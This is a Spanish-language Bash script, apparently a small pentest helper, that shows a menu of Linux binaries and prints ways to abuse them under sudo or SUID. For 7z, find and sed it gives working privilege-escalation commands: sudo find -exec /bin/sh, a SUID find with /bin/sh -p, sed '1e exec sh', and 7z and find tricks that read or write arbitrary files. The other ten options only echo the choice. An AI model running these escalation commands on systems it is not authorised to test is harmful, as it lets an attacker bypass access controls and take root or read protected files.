#!/bin/bash

#---------------------------------------------
# Colores
#---------------------------------------------
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
RESET='\e[0m'

#---------------------------------------------
# Salida del script
#---------------------------------------------
cleanup() {
        printf "\n${RED}[+] Abandonando el script ...${RESET}\n"
        exit 1
}

trap cleanup SIGINT

while true; do
	clear


#---------------------------------------------
# Banner
#---------------------------------------------
printf "${RED}
 ██████╗ ██╗███╗   ██╗███████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██████╔╝██║██╔██╗ ██║███████╗██║     ██████╔╝███████║██║     █████╔╝ 
██╔══██╗██║██║╚██╗██║╚════██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
██████╔╝██║██║ ╚████║███████║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                     
${RESET}"

printf "${RED}---------------------------------------------------------------------------${RESET}\n\n"
printf "${RED}[-] Abuso de binarios con privilegios elevados - Permisos sudoers${RESET}\n\n"
printf "${RED}[-] https://github.com/wvverez${RESET}\n\n"
printf "${RED}[-] Creador : @wvverez${RESET}\n\n"
printf "${RED}[-] Tele : @wvverez${RESET}\n\n"
printf "${RED}----------------------------------------------------------------------------${RESET}\n\n"  


opciones=("7z" "find" "sed" "neofetch" "bash" "nft" "more" "logsave" "less" "man" "pg" "red" "script")

columnas=8
i=0

printf "${YELLOW}\uf071 Elige binario a abusar${RESET}\n\n"

for binario in "${opciones[@]}"; do
    printf "${CYAN}%2d)${RESET} ${GREEN}%-10s${RESET}" "$((i+1))" "$binario"
    ((i++))
    if (( i % columnas == 0 )); then
        echo
    fi
done

if (( i % columnas != 0 )); then
    echo
fi

read -p "Selecciona binario: " opcion

#---------------------------------------------
# Menú
#---------------------------------------------
printf "${YELLOW}\uf071 Elige binario a abusar${RESET}\n\n"

printf "${CYAN}1)${RESET} ${GREEN}7z${RESET}\n\n"
printf "${CYAN}2)${RESET} ${GREEN}find${RESET}\n\n"
printf "${CYAN}3)${RESET} ${GREEN}sed${RESET}\n\n"
printf "${CYAN}4)${RESET} ${GREEN}neofetch${RESET}\n\n"
printf "${CYAN}5)${RESET} ${GREEN}bash${RESET}\n\n"
printf "${CYAN}6)${RESET} ${GREEN}nft${RESET}\n\n"
printf "${CYAN}7)${RESET} ${GREEN}more${RESET}\n\n"
printf "${CYAN}8)${RESET} ${GREEN}logsave${RESET}\n\n"
printf "${CYAN}9)${RESET} ${GREEN}less${RESET}\n\n"
printf "${CYAN}10)${RESET} ${GREEN}man${RESET}\n\n"
printf "${CYAN}11)${RESET} ${GREEN}pg${RESET}\n\n"
printf "${CYAN}12)${RESET} ${GREEN}red${RESET}\n\n"
printf "${CYAN}13)${RESET} ${GREEN}script${RESET}\n\n"

read -p "Selecciona binario: " opcion

#---------------------------------------------
# Opciones del menú
#---------------------------------------------
case $opcion in

1)
    printf "${GREEN}[+] Binario seleccionado... :${RESET} ${CYAN}7z${RESET}\n\n"
    printf "${YELLOW}Como abusar de el:${RESET}\n"

    printf "${RED}[+] SUDO${RESET}=\n"
    echo ""
    printf "LFILE=file_to_read\n"
	echo ""
    printf "sudo 7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    echo ""
    printf "${RED}[+] FILEREAD${RESET}=\n"
    echo ""
    printf "LFILE=file_to_read\n"
    echo ""
    printf "7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    ;;


2)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}find${RESET}\n\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n\n"

	printf "${RED}[+] SUDO ${RESET}=\n"
	printf "sudo find . -exec /bin/sh \\; -quit\n\n"

	printf "${RED}[+] SHELL ${RESET}=\n"
	printf "find . -exec /bin/sh \\; -quit\n\n"

	printf "${RED}[+] SUID ${RESET}=\n"
	printf "sudo install -m =xs \$(which find) .\n"
	printf "./find . -exec /bin/sh -p \\; -quit\n\n"

	printf "${RED}[+] FILEWRITE ${RESET}= LFILE=file_to_write; find / -fprintf \"\$LFILE\" DATA -quit\n"
	;;

3)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}sed${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}= sudo sed -n '1e exec sh 1>&0' /etc/hosts \n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}= sed -n '1e exec sh 1>&0' /etc/hosts OR sed e \n"
    ;;

4)
    printf "${GREEN}Elegiste:${RESET} ${CYAN}neofetch${RESET}\n"
    ;;
5)
	printf "${GREEN}Elegiste:${RESET} ${CYAN}bash${RESET}\n"
	;;

6) 

	printf "${GREEN}Elegiste:${RESET} ${CYAN}nft${RESET}\n"
	;;
7) 

	printf "${GREEN}Elegiste:${RESET} ${CYAN}more${RESET}\n"
	;;

8) 

	printf "${GREEN}Elegiste:${RESET} ${CYAN}logsave${RESET}\n"
	;;

9)

	printf "${GREEN}Elegiste:${RESET} ${CYAN}less${RESET}\n"
	;;

10)

	printf "${GREEN}Elegiste:${RESET} ${CYAN}man${RESET}\n"
	;;

11)

	printf "${GREEN}Elegiste:${RESET} ${CYAN}pg${RESET}\n"
	;;

12) 

	printf "${GREEN}Elegiste:${RESET} ${CYAN}red${RESET}\n"
	;;

13)
	printf "${GREEN}Elegiste:${RESET} ${CYAN}script${RESET}\n"
	;;

*)
    printf "${RED}Binario no encontrado...${RESET}\n"
    ;;
esac

echo ""


read -p "¿Quieres elegir otro binario? (Y/N): " again
    case "$again" in
        Y|y) continue ;;
        N|n) cleanup ;;
        *) 
            printf "${RED}Respuesta no válida. Saliendo...${RESET}\n"
            cleanup
        ;;
    esac

done
